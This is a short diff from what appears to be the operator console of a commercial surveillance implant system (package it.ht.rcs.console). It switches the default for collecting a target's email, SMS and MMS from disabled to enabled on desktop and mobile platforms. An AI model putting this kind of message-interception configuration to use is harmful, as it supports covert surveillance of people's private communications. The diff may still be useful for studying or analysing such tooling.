@@ -147,9 +147,9 @@ package it.ht.rcs.console
         
         {
           module: "messages",
-          mail: {enabled: false, filter: {history: true, datefrom: formatter.format(today), maxsize: 100000}},
-          sms:  {enabled: false, filter: {history: true, datefrom: formatter.format(today)}},
-          mms:  {enabled: false, filter: {history: true, datefrom: formatter.format(today)}},
+          mail: {enabled: true, filter: {history: false, datefrom: formatter.format(today), maxsize: 100000}},
+          sms:  {enabled: true, filter: {history: false, datefrom: formatter.format(today)}},
+          mms:  {enabled: true, filter: {history: false, datefrom: formatter.format(today)}},
           _type: "desktop,mobile",
           _platform: "windows,ios,blackberry,winmo,symbian,android"
         },
